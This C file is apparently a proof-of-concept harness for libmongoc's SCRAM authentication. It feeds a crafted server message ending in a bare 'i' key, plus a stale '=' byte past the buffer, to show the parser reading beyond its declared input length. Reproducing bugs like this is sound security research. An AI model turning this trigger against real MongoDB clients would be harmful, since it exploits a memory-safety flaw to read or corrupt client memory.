#include <mongoc/mongoc-crypto-private.h>
#include <mongoc/mongoc-scram-private.h>
#include <bson/bson.h>
#include <stdio.h>
#include <string.h>

/* Second variant: simulate the *real* mongoc-cluster.c call site, where
 * inbuf is a reused, oversized stack/heap buffer whose bytes past the
 * "logical" inbuflen boundary are stale leftover data from a PRIOR
 * network read in the same SCRAM exchange -- rather than guaranteed
 * zero/undefined. We allocate inbuflen+1 bytes (so the first
 * one-byte-past-the-end read does not itself cross a real heap
 * boundary), and set that extra byte to '=' to show what the parser
 * does next once it believes it has found "key=" at the very edge of
 * the caller-declared length.
 */
int
main (void)
{
   mongoc_scram_t scram;
   uint8_t out_buf[4096] = {0};
   uint32_t out_buflen = 0;
   bson_error_t error;
   bool ok;

   memset (&scram, 0, sizeof (scram));

   _mongoc_scram_init (&scram, MONGOC_CRYPTO_ALGORITHM_SHA_256);
   _mongoc_scram_set_user (&scram, "testuser");
   _mongoc_scram_set_pass (&scram, "testpass");

   ok = _mongoc_scram_step (&scram, out_buf, 0, out_buf, sizeof (out_buf), &out_buflen, &error);
   if (!ok) {
      fprintf (stderr, "step1 failed: %s\n", error.message);
      return 2;
   }

   const char *malicious = "r=";
   size_t base_len = strlen (malicious) + (size_t) scram.encoded_nonce_len;
   char *crafted = bson_malloc0 (base_len + 32);
   size_t n = 0;
   memcpy (crafted + n, malicious, strlen (malicious));
   n += strlen (malicious);
   memcpy (crafted + n, scram.encoded_nonce, (size_t) scram.encoded_nonce_len);
   n += (size_t) scram.encoded_nonce_len;
   const char *tail = ",s=YWJjZA==,i"; /* ends in bare 'i', logical length n */
   memcpy (crafted + n, tail, strlen (tail));
   n += strlen (tail);

   /* Allocate n+1 bytes: byte [n] simulates stale leftover data (here,
    * deliberately '=') from a prior message in the same reused buffer. */
   uint8_t *inbuf = bson_malloc (n + 1);
   memcpy (inbuf, crafted, n);
   inbuf[n] = '='; /* stale byte the parser is NOT supposed to look at */
   bson_free (crafted);

   printf ("crafted payload (%zu logical bytes, %zu allocated): %.*s | stale-byte='='\n", n, n + 1, (int) n, (char *) inbuf);

   scram.step = 1;
   out_buflen = 0;
   memset (out_buf, 0, sizeof (out_buf));

   ok = _mongoc_scram_step (&scram, inbuf, (uint32_t) n, out_buf, sizeof (out_buf), &out_buflen, &error);

   printf ("step2 returned %d, error: %s\n", ok, ok ? "(none)" : error.message);

   bson_free (inbuf);
   _mongoc_scram_destroy (&scram);

   printf ("PoC completed\n");
   return 0;
}
